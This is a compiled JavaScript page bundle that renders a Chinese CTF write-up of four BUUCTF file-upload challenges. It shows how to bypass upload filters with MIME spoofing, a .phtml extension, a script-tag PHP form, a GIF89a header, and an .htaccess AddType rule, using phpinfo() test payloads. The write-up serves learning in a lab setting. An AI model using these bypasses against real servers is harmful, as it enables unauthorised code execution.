(window.webpackJsonp=window.webpackJsonp||[]).push([[43],{399:function(a,s,t){"use strict";t.r(s);var p=t(8),e=Object(p.a)({},(function(){var a=this,s=a._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[s("p",[a._v("题目收集自BUUCTF等平台，如有侵权告知删除")]),a._v(" "),s("h2",{attrs:{id:"极客大挑战-2019-upload-1"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#极客大挑战-2019-upload-1"}},[a._v("#")]),a._v(" [极客大挑战 2019]Upload 1")]),a._v(" "),s("p",[a._v("题目地址"),s("a",{attrs:{href:"https://buuoj.cn/challenges#%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DUpload",target:"_blank",rel:"noopener noreferrer"}},[a._v("[极客大挑战 2019]Upload 1"),s("OutboundLink")],1)]),a._v(" "),s("p",[a._v("正常上传一个简单的php文件，会提示不是图片文件")]),a._v(" "),s("div",{staticClass:"language-php line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-php"}},[s("code",[a._v("# 1.php\n"),s("span",{pre:!0,attrs:{class:"token php language-php"}},[s("span",{pre:!0,attrs:{class:"token delimiter important"}},[a._v("<?=")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("phpinfo")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(";")]),s("span",{pre:!0,attrs:{class:"token delimiter important"}},[a._v("?>")])]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br")])]),s("p",[a._v("先从最简单的开始，尝试BP抓包修改报文中MIME类型，放行。又提示上传的是PHP文件，换一个不常见的扩展名.phtml，提示匹配到了<?")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/upload-practise/1.png",alt:"1"}})]),a._v(" "),s("p",[a._v("换成js脚本的写法")]),a._v(" "),s("div",{staticClass:"language-php line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-php"}},[s("code",[s("span",{pre:!0,attrs:{class:"token comment"}},[a._v("# 1.phtml")]),a._v("\n"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("<")]),a._v("script language"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[a._v("'php'")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("phpinfo")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(";")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("<")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("/")]),a._v("script"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br")])]),s("p",[a._v("提示上传失败，检测到不是图片文件，给他加个图片文件头的特征")]),a._v(" "),s("p",[a._v("参考"),s("a",{attrs:{href:"https://blog.csdn.net/weixin_62715196/article/details/132279908",target:"_blank",rel:"noopener noreferrer"}},[a._v("图片文件头"),s("OutboundLink")],1)]),a._v(" "),s("div",{staticClass:"language-php line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-php"}},[s("code",[s("span",{pre:!0,attrs:{class:"token comment"}},[a._v("# 1.phtml")]),a._v("\nGIF89a\n"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("<")]),a._v("script language"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[a._v("'php'")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("phpinfo")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(";")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("<")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("/")]),a._v("script"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br")])]),s("p",[s("img",{attrs:{src:"/medias/upload-practise/2.png",alt:"2"}})]),a._v(" "),s("p",[a._v("再次上传成功,访问url/upload/1.phtml看到phpinfo()函数执行")]),a._v(" "),s("h2",{attrs:{id:"actf2020-新生赛-upload-1"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#actf2020-新生赛-upload-1"}},[a._v("#")]),a._v(" [ACTF2020 新生赛]Upload 1")]),a._v(" "),s("p",[a._v("题目地址"),s("a",{attrs:{href:"https://buuoj.cn/challenges#%5BACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B%5DUpload",target:"_blank",rel:"noopener noreferrer"}},[a._v("[ACTF2020 新生赛]Upload 1"),s("OutboundLink")],1)]),a._v(" "),s("p",[a._v("正常上传php文件，js弹出只能上传图片")]),a._v(" "),s("p",[a._v("禁用js，我用chrome插件禁用js")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/upload-practise/3.png",alt:"3"}})]),a._v(" "),s("p",[a._v("禁用后，php文件还是上传不了，php3，php5也不行，尝试上传一个phtml文件")]),a._v(" "),s("div",{staticClass:"language-php line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-php"}},[s("code",[a._v("# 1.phtml\n"),s("span",{pre:!0,attrs:{class:"token php language-php"}},[s("span",{pre:!0,attrs:{class:"token delimiter important"}},[a._v("<?php")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("phpinfo")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(";")]),s("span",{pre:!0,attrs:{class:"token delimiter important"}},[a._v("?>")])]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br")])]),s("p",[a._v("上传后访问，phpinfo()函数执行")]),a._v(" "),s("h2",{attrs:{id:"mrctf2020-你传你🐎呢-1"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#mrctf2020-你传你🐎呢-1"}},[a._v("#")]),a._v(" [MRCTF2020]你传你🐎呢 1")]),a._v(" "),s("p",[a._v("题目地址"),s("a",{attrs:{href:"https://buuoj.cn/challenges#%5BMRCTF2020%5D%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2",target:"_blank",rel:"noopener noreferrer"}},[a._v("[MRCTF2020]你传你🐎呢 1"),s("OutboundLink")],1)]),a._v(" "),s("p",[a._v("传php文件都失败了，看样子只能用图片了。上传.htacess文件失败，修改MIME类型，.htacesss文件上传成功。")]),a._v(" "),s("div",{staticClass:"language-htacess line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[a._v("# .htacess\nAddType application/x-httpd-php .png\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br")])]),s("blockquote",[s("p",[a._v('".htaccess" 文件是 Apache Web 服务器特有的文件，用于配置服务器的行为。通过 ".htaccess" 文件，用户可以在特定目录中覆盖 Apache 服务器的全局配置，包括重定向、认证、缓存控制等。')])]),a._v(" "),s("p",[a._v("接着上传图片")]),a._v(" "),s("div",{staticClass:"language-php line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-php"}},[s("code",[a._v("# 1.png\n"),s("span",{pre:!0,attrs:{class:"token php language-php"}},[s("span",{pre:!0,attrs:{class:"token delimiter important"}},[a._v("<?php")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("phpinfo")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(";")]),s("span",{pre:!0,attrs:{class:"token delimiter important"}},[a._v("?>")])]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br")])]),s("p",[a._v("上传成功，访问看到phpinfo()函数执行")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/upload-practise/5.png",alt:"5"}})]),a._v(" "),s("h2",{attrs:{id:"gxyctf2019-babyupload-1"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#gxyctf2019-babyupload-1"}},[a._v("#")]),a._v(" [GXYCTF2019]BabyUpload 1")]),a._v(" "),s("p",[a._v("题目地址"),s("a",{attrs:{href:"https://buuoj.cn/challenges#%5BGXYCTF2019%5DBabyUpload",target:"_blank",rel:"noopener noreferrer"}},[a._v("[GXYCTF2019]BabyUpload 1"),s("OutboundLink")],1)]),a._v(" "),s("p",[a._v("上传php文件提示不能上传后缀名有ph的文件，这题看来要用图片。上传png，gif图片失败，修改MIME类型也不能上传，最后看大佬博客发现只能用jpeg")]),a._v(" "),s("p",[s("a",{attrs:{href:"https://blog.csdn.net/weixin_47055136/article/details/131291140",target:"_blank",rel:"noopener noreferrer"}},[a._v("【CTF】[GXYCTF 2019]BabyUpload"),s("OutboundLink")],1)]),a._v(" "),s("p",[s("a",{attrs:{href:"https://blog.csdn.net/2302_79800344/article/details/136428034",target:"_blank",rel:"noopener noreferrer"}},[a._v("[GXYCTF2019]BabyUpload1 -- 题目分析与详解"),s("OutboundLink")],1)]),a._v(" "),s("p",[a._v("最后BP抓包MIME类型修改为image/jpeg竟然上传成功了。")]),a._v(" "),s("p",[a._v("上传.htacess文件")]),a._v(" "),s("div",{staticClass:"language-htacess line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[a._v("# .htacess\nAddType application/x-httpd-php .png\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br")])]),s("p",[a._v("上传png图片")]),a._v(" "),s("div",{staticClass:"language-php line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-php"}},[s("code",[a._v("# 1.png\n"),s("span",{pre:!0,attrs:{class:"token php language-php"}},[s("span",{pre:!0,attrs:{class:"token delimiter important"}},[a._v("<?php")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("phpinfo")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(";")]),s("span",{pre:!0,attrs:{class:"token delimiter important"}},[a._v("?>")])]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br")])]),s("p",[a._v("提示还是php文件，尝试使用js格式")]),a._v(" "),s("div",{staticClass:"language-php line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-php"}},[s("code",[s("span",{pre:!0,attrs:{class:"token comment"}},[a._v("# 1.png")]),a._v("\n"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("<")]),a._v("script language"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[a._v("'php'")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("phpinfo")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(";")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("<")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("/")]),a._v("script"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br")])]),s("p",[a._v("上传成功，访问看到phpinfo()函数执行")])])}),[],!1,null,null,null);s.default=e.exports}}]);